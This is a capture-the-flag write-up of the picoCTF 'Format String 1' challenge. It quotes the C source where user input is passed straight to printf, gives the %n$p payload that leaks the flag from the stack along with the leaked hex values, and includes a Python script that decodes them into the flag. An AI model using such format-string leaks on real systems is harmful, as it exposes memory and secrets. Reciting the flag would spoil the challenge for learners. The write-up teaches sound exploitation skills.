# Writeup: Format String 1

## Introduction

The vulnerability we will be taking advantage of today is called the string format vulnerability. The string format vulnerability takes advantage of the printf functions ability to use format specifiers to replace text with inputs. In this case we will be using the '%p' format specifier to leak addresses on the stack. The following lines in the provided source contain the vulnerabilty.

```
    printf("Give me your order and I'll read it back to you:\n");
    fflush(stdout);
    scanf("%1024s", buf);
    printf("Here's your order: ");
    printf(buf);
```

## Leaking The Stack Contents

As you can see the buffer was passed into the printf function without a string with a print format specifier allowing us to take advantage and insert our own format specifier, which in this case is %p. In order to leak specific positions on the stack we use this format: %n$p. Where n is the position on the stack. Since the flag is read into the flag buffer before this scanf and printf execute we should be able to find the flag on the stack using the print format specifier. The following code shows where the flag was read int.

```
    fd = fopen("flag.txt", "r");
    if (fd == NULL){
        printf("'flag.txt' file not found, aborting.\n");
        return 1;
  }
```

## Results

After about 5 minutes of leaking address positions and attempting to translate the leaked contents of the stack to ASCII characters I was able to find the flag using the following input:

```
    Give me your order and I'll read it back to you:
    %14$p.%15$p.%16$p.%17$p.%18$p
    Here's your order: 0x7b4654436f636970.0x355f31346d316e34.0x3478345f33317937.0x65355f673431665f.0x7d346263623736     
```

Finally, all we have to do is take the leaked stack contents and conver them into ascii. I was able to do this by using python like so:

```
    def hex_to_str(val, num_bytes, endian='little'):
    b = val.to_bytes(num_bytes, endian)
    return ''.join(chr(x) if 32 <= x < 127 else '.' for x in b)

    data = [
        (0x7b4654436f636970, 8),
        (0x355f31346d316e34, 8),
        (0x3478345f33317937, 8),
        (0x65355f673431665f, 8),
        (0x7d346263623736, 8)
        ]

    for val, n in data:
        print(f'{hex(val)} -> {hex_to_str(val, n)}')

    print(''.join(hex_to_str(v, n) for v, n in data))
```
And here is the flag and the output of the python script: 

```
    0x7b4654436f636970 -> picoCTF{
    0x355f31346d316e34 -> 4n1m41_5
    0x3478345f33317937 -> 7y13_4x4
    0x65355f673431665f -> _f14g_5e
    0x7d346263623736 -> 67bcb4}.
    picoCTF{4n1m41_57y13_4x4_f14g_5e67bcb4}.
```
